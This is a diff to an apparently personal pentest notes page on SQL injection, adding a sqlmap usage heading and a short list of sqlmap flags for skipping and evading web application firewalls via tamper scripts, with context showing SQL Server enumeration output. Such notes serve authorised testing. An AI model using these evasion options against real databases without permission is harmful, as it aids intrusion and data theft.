@@ -1,5 +1,7 @@
 # SQL Injection
 
+## Basic usage of sqlmap
+
 Test POST request :&#x20;
 
 ```
@@ -27,4 +29,13 @@ Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
 
 current user is DBA: False
 
+```
+
+## Bypass protections with sqlmap
+
+```
+--skip-waf
+--tamper=between
+--tamper=base64encode
+--tamper=charencode
 ```
